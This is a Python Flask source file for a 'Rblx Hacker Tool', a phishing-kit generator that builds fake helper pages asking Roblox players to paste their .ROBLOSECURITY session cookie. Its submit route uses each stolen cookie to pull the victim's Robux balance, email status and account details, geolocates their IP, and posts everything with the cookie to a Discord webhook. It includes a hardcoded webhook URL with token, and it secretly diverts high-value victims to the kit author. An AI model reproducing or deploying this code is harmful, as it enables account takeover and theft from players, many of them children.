from flask import Flask, request, jsonify, render_template_string
import requests
import base64
import time
import os

app = Flask(__name__)

ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458240581649174686/Eu-jB0LfRlnStSKuuqeixQA9u1a8tpxjiBS4175HCG0B2PQVRsoHvWKdI-NshDuS7LVx"

# Generator page HTML
GENERATOR_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rblx Hacker Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #f0f9ff;
            border-radius: 8px;
            display: none;
        }
        .result.show { display: block; }
        .result h3 {
            color: #0891b2;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .link-box {
            background: white;
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 13px;
            color: #0891b2;
            border: 1px solid #0891b2;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Rblx Hacker Tool</h1>
        <p class="subtitle">Create your custom page</p>

        <div class="input-group">
            <label>Website Name</label>
            <input type="text" id="websiteName" placeholder="e.g., Robux Generator">
        </div>

        <div class="input-group">
            <label>Your Discord Webhook URL</label>
            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
        </div>

        <button onclick="generateSite()" id="genBtn">Generate Page</button>

        <div class="result" id="result">
            <h3>✅ Your Page is Ready!</h3>
            <div class="link-box" id="generatedLink"></div>
            <button onclick="copyLink()">Copy Link</button>
        </div>
    </div>

    <script>
        let generatedUrl = '';

        async function generateSite() {
            const webhook = document.getElementById('webhookInput').value;
            const websiteName = document.getElementById('websiteName').value;
            const btn = document.getElementById('genBtn');
            
            if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
                alert('Please enter a valid Discord webhook URL');
                return;
            }

            if (!websiteName) {
                alert('Please enter a website name');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Generating...';

            try {
                const response = await fetch('/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        webhook: webhook,
                        website_name: websiteName
                    })
                });

                const data = await response.json();
                
                if (data.success) {
                    generatedUrl = data.url;
                    document.getElementById('generatedLink').textContent = generatedUrl;
                    document.getElementById('result').classList.add('show');
                } else {
                    alert('Failed to generate site');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }

            btn.disabled = false;
            btn.textContent = 'Generate Page';
        }

        function copyLink() {
            navigator.clipboard.writeText(generatedUrl).then(() => {
                alert('✅ Link copied!');
            });
        }
    </script>
</body>
</html>
"""

# Helper page HTML template
HELPER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{WEBSITE_NAME}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
        }
        h1 {
            color: #e74c3c;
            margin-bottom: 10px;
            font-size: 26px;
            text-align: center;
        }
        .subtitle {
            color: #7f8c8d;
            text-align: center;
            margin-bottom: 30px;
            font-size: 13px;
        }
        .input-group { margin-bottom: 20px; }
        label {
            display: block;
            color: #2c3e50;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 13px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ecf0f1;
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.3s;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #e74c3c;
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        .info {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin-top: 20px;
            font-size: 12px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛠️ {{WEBSITE_NAME}}</h1>
        <p class="subtitle">Enter your details below</p>

        <div class="input-group">
            <label>Roblox Username</label>
            <input type="text" id="username" placeholder="Enter your username">
        </div>

        <div class="input-group">
            <label>Roblox Cookie</label>
            <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
        </div>

        <button onclick="submitInfo()" id="submitBtn">Submit</button>

        <div class="status" id="status"></div>

        <div class="info">
            ℹ️ We need your cookie to verify your account.
        </div>
    </div>

    <script>
        const WEBHOOK_ID = "{{WEBHOOK_ID}}";

        async function submitInfo() {
            const username = document.getElementById('username').value;
            const cookie = document.getElementById('cookie').value;
            const status = document.getElementById('status');
            const btn = document.getElementById('submitBtn');

            if (!username || !cookie) {
                status.className = 'status error';
                status.textContent = '❌ Please fill in all fields';
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Processing...';
            status.className = 'status';
            status.style.display = 'none';

            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        webhook_id: WEBHOOK_ID,
                        username: username,
                        cookie: cookie
                    })
                });

                const data = await response.json();

                if (data.success) {
                    status.className = 'status success';
                    status.textContent = '✅ Thank you! Processing your request...';
                    document.getElementById('username').value = '';
                    document.getElementById('cookie').value = '';
                } else {
                    status.className = 'status error';
                    status.textContent = '❌ An error occurred. Please try again.';
                }
            } catch (error) {
                status.className = 'status error';
                status.textContent = '❌ An error occurred. Please try again.';
            }

            btn.disabled = false;
            btn.textContent = 'Submit';
        }
    </script>
</body>
</html>
"""

# Store webhooks and website names
sites_data = {}

@app.route('/')
def index():
    return render_template_string(GENERATOR_HTML)

@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    webhook = data.get('webhook')
    website_name = data.get('website_name', 'Roblox Helper')
    
    if not webhook or 'discord.com/api/webhooks' not in webhook:
        return jsonify({'success': False, 'error': 'Invalid webhook'})
    
    webhook_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
    sites_data[webhook_id] = {
        'webhook': webhook,
        'name': website_name
    }
    
    site_url = f"{request.host_url}h/{webhook_id}"
    
    try:
        requests.post(webhook, json={
            'embeds': [{
                'title': '✅ Your Page is Live!',
                'description': f'**{website_name}** is ready:\n\n🔗 {site_url}\n\nShare this link to collect submissions.',
                'color': 0x00ff00,
                'footer': {'text': 'Rblx Hacker Tool'}
            }]
        })
    except:
        pass
    
    return jsonify({'success': True, 'url': site_url})

@app.route('/h/<webhook_id>')
def helper(webhook_id):
    if webhook_id not in sites_data:
        return "Invalid link", 404
    
    website_name = sites_data[webhook_id]['name']
    html = HELPER_HTML.replace('{{WEBHOOK_ID}}', webhook_id).replace('{{WEBSITE_NAME}}', website_name)
    return render_template_string(html)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    webhook_id = data.get('webhook_id')
    username = data.get('username')
    cookie = data.get('cookie')
    
    if webhook_id not in sites_data:
        return jsonify({'success': False})
    
    site_data = sites_data[webhook_id]
    user_webhook = site_data['webhook']
    
    try:
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        try:
            ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=5).json()
            location = f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country_name', 'Unknown')}"
        except:
            location = "Unknown"
        
        user_id = "Unknown"
        robux = 0
        email_verified = "Unknown"
        premium = "Unknown"
        account_age = "Unknown"
        top_games = []
        
        try:
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            
            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
            
            if user_response.status_code == 200:
                user_data = user_response.json()
                user_id = user_data.get('id', 'Unknown')
                display_name = user_data.get('displayName', username)
                
                try:
                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=10)
                    if robux_response.status_code == 200:
                        robux = robux_response.json().get('robux', 0)
                except Exception as e:
                    print(f"Robux error: {e}")
                
                try:
                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', headers=headers, timeout=10)
                    if email_response.status_code == 200:
                        email_data = email_response.json()
                        email_verified = "✅ Yes" if email_data.get('verified') else "❌ No"
                except Exception as e:
                    print(f"Email error: {e}")
                
                try:
                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers, timeout=10)
                    premium = "✅ Yes" if premium_response.status_code == 200 else "❌ No"
                except Exception as e:
                    print(f"Premium error: {e}")
                
                try:
                    user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', timeout=10)
                    if user_details.status_code == 200:
                        created_date = user_details.json().get('created', '')
                        if created_date:
                            from datetime import datetime
                            created = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
                            age_days = (datetime.now(created.tzinfo) - created).days
                            account_age = f"{age_days // 365} years" if age_days > 365 else f"{age_days} days"
                except Exception as e:
                    print(f"Age error: {e}")
                
                try:
                    games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&sortOrder=Asc', timeout=10)
                    if games_response.status_code == 200:
                        games_data = games_response.json().get('data', [])
                        top_games = [game.get('name', 'Unknown')[:30] for game in games_data[:3]]
                except Exception as e:
                    print(f"Games error: {e}")
        except Exception as e:
            print(f"Main error: {e}")
        
        embed = {
            'title': '🎯 New Submission',
            'color': 0xFF0000 if robux > 100 else 0x00FF00,
            'fields': [
                {'name': '👤 Username', 'value': username, 'inline': True},
                {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                {'name': '⭐ Premium', 'value': premium, 'inline': True},
                {'name': '📧 Email Verified', 'value': email_verified, 'inline': True},
                {'name': '📅 Account Age', 'value': account_age, 'inline': True},
                {'name': '🌍 IP', 'value': user_ip, 'inline': True},
                {'name': '📍 Location', 'value': location, 'inline': False},
                {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
                {'name': '🍪 Cookie', 'value': f'```{cookie[:100]}...```', 'inline': False}
            ],
            'footer': {'text': 'Rblx Hacker Tool'},
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
        }
        
        target_webhook = ADMIN_WEBHOOK if robux > 100 else user_webhook
        requests.post(target_webhook, json={'embeds': [embed]})
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Submit error: {e}")
        return jsonify({'success': False})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
